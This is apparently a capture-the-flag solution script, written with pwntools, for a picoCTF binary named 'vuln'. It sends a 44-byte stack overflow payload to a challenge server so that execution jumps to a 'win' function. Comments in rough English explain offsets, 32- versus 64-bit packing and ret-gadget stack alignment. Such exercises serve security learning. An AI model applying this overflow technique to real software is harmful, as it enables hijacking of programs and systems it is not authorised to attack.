from pwn import *

elf = context.binary = ELF('./vuln')
#p = process()
p = remote('dolphin-cove.picoctf.net', 59944)

#in 32 bit files, you don't need the ret gadget actually. You can do spamming A until hit EIP and then you can direct to win.
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
win = elf.sym['win']

#if manual: 
#win = p32(0x08049276)
#oh also p32 and p64 are different. p32 -> send only 4byte to memory and p64 send 8byte to memory. It make easier if you use gdb to debug.

payload = flat(
    'A'*40, #if you refer at echo escape 1
    'B'*4, #this is actually stack allignment and send only dumb and total offset = 44. 
    # ret, #but in 64 file, this need for stack alignment to get win address. But almost payload need this one
    win
)

p.sendlineafter('key: ', payload)
p.interactive()